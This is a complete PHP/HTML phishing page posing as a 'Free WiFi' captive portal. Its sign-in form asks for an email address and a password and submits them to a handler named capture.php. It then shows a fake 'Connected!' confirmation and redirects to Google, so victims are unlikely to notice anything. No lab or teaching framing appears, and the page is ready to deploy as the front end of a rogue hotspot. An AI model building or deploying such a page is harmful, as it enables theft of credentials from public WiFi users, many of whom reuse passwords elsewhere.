<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'login';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; width: 380px; padding: 40px; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .wifi-icon { font-size: 48px; text-align: center; margin-bottom: 16px; }
        h1 { font-size: 24px; text-align: center; margin-bottom: 8px; color: #333; }
        .subtitle { text-align: center; color: #666; margin-bottom: 32px; font-size: 14px; }
        input { width: 100%; padding: 14px 16px; font-size: 16px; border: 2px solid #e1e1e1; border-radius: 8px; margin-bottom: 16px; outline: none; }
        input:focus { border-color: #667eea; }
        .submit-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; border-radius: 8px; }
        .terms { font-size: 12px; color: #999; text-align: center; margin-top: 16px; }
        .success { text-align: center; }
        .success .check { font-size: 64px; margin-bottom: 16px; }
    </style>
</head>
<body>
<div class="container">
    <?php if($stage == 'login'): ?>
    <div class="wifi-icon">📶</div>
    <h1>Free WiFi Access</h1>
    <p class="subtitle">Sign in with your email to connect</p>
    <form method="POST" action="capture.php">
        <input type="email" name="email" placeholder="Email address" required>
        <input type="password" name="password" placeholder="Create a password">
        <button type="submit" class="submit-btn">Connect to WiFi</button>
    </form>
    <p class="terms">By connecting, you agree to our Terms of Service</p>

    <?php elseif($stage == 'success'): ?>
    <div class="success">
        <div class="check">✅</div>
        <h1>Connected!</h1>
        <p class="subtitle">You now have internet access.</p>
    </div>
    <script>setTimeout(function(){window.location='https://www.google.com';},3000);</script>
    <?php endif; ?>
</div>
</body>
</html>
